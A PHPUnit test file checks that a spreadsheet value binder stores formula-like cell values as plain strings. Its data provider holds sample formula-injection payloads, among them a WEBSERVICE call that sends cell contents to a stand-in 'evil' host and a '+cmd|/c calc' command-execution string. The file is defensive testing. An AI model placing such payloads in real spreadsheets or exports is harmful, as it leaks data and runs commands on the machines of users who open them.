<?php

declare(strict_types=1);

namespace Tvdt\Tests\Unit\Helpers;

use PhpOffice\PhpSpreadsheet\Cell\Cell;
use PhpOffice\PhpSpreadsheet\Cell\DataType;
use PhpOffice\PhpSpreadsheet\Cell\DefaultValueBinder;
use PhpOffice\PhpSpreadsheet\Spreadsheet;
use PHPUnit\Framework\Attributes\CoversClass;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;
use Tvdt\Helpers\FormulaInjectionSafeValueBinder;

#[CoversClass(FormulaInjectionSafeValueBinder::class)]
final class FormulaInjectionSafeValueBinderTest extends TestCase
{
    protected function setUp(): void
    {
        Cell::setValueBinder(new FormulaInjectionSafeValueBinder());
    }

    protected function tearDown(): void
    {
        Cell::setValueBinder(new DefaultValueBinder());
    }

    /** @return iterable<string, array{string}> */
    public static function dangerousValueProvider(): iterable
    {
        yield 'equals-prefixed formula' => ['=WEBSERVICE("http://evil/?"&A1)'];
        yield 'plus-prefixed' => ['+cmd|/c calc'];
        yield 'minus-prefixed' => ['-2+3'];
        yield 'at-prefixed' => ['@SUM(1,1)'];
    }

    #[DataProvider('dangerousValueProvider')]
    public function testDangerousValuesAreStoredAsPlainStrings(string $value): void
    {
        $sheet = new Spreadsheet()->getActiveSheet();
        $sheet->setCellValue('A1', $value);

        $cell = $sheet->getCell('A1');
        $this->assertSame(DataType::TYPE_STRING, $cell->getDataType());
        $this->assertSame($value, $cell->getValue());
    }

    public function testOrdinaryValuesAreUnaffected(): void
    {
        $sheet = new Spreadsheet()->getActiveSheet();
        $sheet->setCellValue('A1', 'Anna en Bram');
        $sheet->setCellValue('A2', 42);
        $sheet->setCellValue('A3', true);

        $this->assertSame('Anna en Bram', $sheet->getCell('A1')->getValue());
        $this->assertSame(DataType::TYPE_STRING, $sheet->getCell('A1')->getDataType());
        $this->assertSame(42, $sheet->getCell('A2')->getValue());
        $this->assertSame(DataType::TYPE_NUMERIC, $sheet->getCell('A2')->getDataType());
        $this->assertTrue($sheet->getCell('A3')->getValue());
        $this->assertSame(DataType::TYPE_BOOL, $sheet->getCell('A3')->getDataType());
    }
}
